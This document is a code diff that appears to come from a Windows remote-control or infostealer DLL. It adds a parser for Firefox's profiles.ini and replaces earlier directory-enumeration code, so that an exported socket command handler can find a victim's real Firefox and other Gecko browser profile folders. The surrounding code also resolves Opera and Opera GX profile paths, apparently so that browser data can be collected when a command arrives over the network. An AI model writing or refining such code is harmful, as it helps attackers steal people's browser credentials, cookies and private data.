@@ -1712,6 +1712,70 @@ static wstring get_app_path(const wstring& appName) {
     return path;
 }
 
+static wstring get_firefox_real_profile_path(const wstring& sourceUserData) {
+    wstring iniPath = sourceUserData + L"\\profiles.ini";
+    if (!fs::exists(iniPath)) return L"";
+
+    wstring bestPath = L"";
+    wstring currentPath = L"";
+    bool isRelative = true;
+    bool isDefault = false;
+
+    auto commit = [&]() {
+        if (currentPath.empty()) return;
+        wstring full;
+        if (isRelative) {
+            wstring rel = currentPath;
+            replace(rel.begin(), rel.end(), L'/', L'\\');
+            full = sourceUserData + L"\\" + rel;
+        } else {
+            full = currentPath;
+        }
+        if (bestPath.empty() || isDefault) {
+            bestPath = full;
+        }
+    };
+
+    FILE* f = _wfopen(iniPath.c_str(), L"r");
+    if (f) {
+        wchar_t line[512];
+        while (fgetws(line, 512, f)) {
+            wstring t = line;
+            // Trim leading/trailing whitespace
+            t.erase(0, t.find_first_not_of(L" \t\r\n"));
+            t.erase(t.find_last_not_of(L" \t\r\n") + 1);
+
+            if (t.empty()) continue;
+
+            if (t[0] == L'[') {
+                commit();
+                currentPath = L"";
+                isRelative = true;
+                isDefault = false;
+            } else if (_wcsnicmp(t.c_str(), L"Path=", 5) == 0) {
+                currentPath = t.substr(5);
+            } else if (_wcsnicmp(t.c_str(), L"IsRelative=", 11) == 0) {
+                isRelative = (t.substr(11) == L"1");
+            } else if (_wcsnicmp(t.c_str(), L"Default=", 8) == 0) {
+                wstring val = t.substr(8);
+                if (val == L"1") {
+                    isDefault = true;
+                } else {
+                    currentPath = val;
+                    isDefault = true;
+                }
+            }
+        }
+        commit();
+        fclose(f);
+    }
+
+    if (!bestPath.empty() && fs::exists(bestPath)) {
+        return bestPath;
+    }
+    return L"";
+}
+
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
     if (browserName == L"Opera" || browserName == L"Opera GX") {
@@ -2073,20 +2137,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
 
                         if (isGecko) {
-                            wstring profilesPath = sourceUserData + L"\\Profiles";
-                            wstring profileSubDir;
-                            WIN32_FIND_DATAW findData;
-                            HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
-                            if (hFind != INVALID_HANDLE_VALUE) {
-                                do {
-                                    wstring name = findData.cFileName;
-                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                        name != L"." && name != L"..") {
-                                        profileSubDir = name;
-                                        break;
-                                    }
-                                } while (FindNextFileW(hFind, &findData));
-                                FindClose(hFind);
+                            wstring realProfilePath = get_firefox_real_profile_path(sourceUserData);
+                            wstring profileSubDir = L"";
+                            if (!realProfilePath.empty()) {
+                                profileSubDir = realProfilePath.substr(realProfilePath.find_last_of(L"\\/") + 1);
                             }
 
                             if (!profileSubDir.empty()) {
@@ -2127,24 +2181,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         if (isGecko) {
                             wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
                             if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
-                                wstring profilesPath = sourceUserData + L"\\Profiles";
-                                wstring profileSubDir;
-                                WIN32_FIND_DATAW findData;
-                                HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
-                                if (hFind != INVALID_HANDLE_VALUE) {
-                                    do {
-                                        wstring name = findData.cFileName;
-                                        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                            name != L"." && name != L"..") {
-                                            profileSubDir = name;
-                                            break;
-                                        }
-                                    } while (FindNextFileW(hFind, &findData));
-                                    FindClose(hFind);
-                                }
-
-                                if (!profileSubDir.empty()) {
-                                    profilePath = sourceUserData + L"\\Profiles\\" + profileSubDir;
+                                wstring realProfilePath = get_firefox_real_profile_path(sourceUserData);
+                                if (!realProfilePath.empty()) {
+                                    profilePath = realProfilePath;
                                 } else {
                                     profilePath = sourceUserData;
                                 }
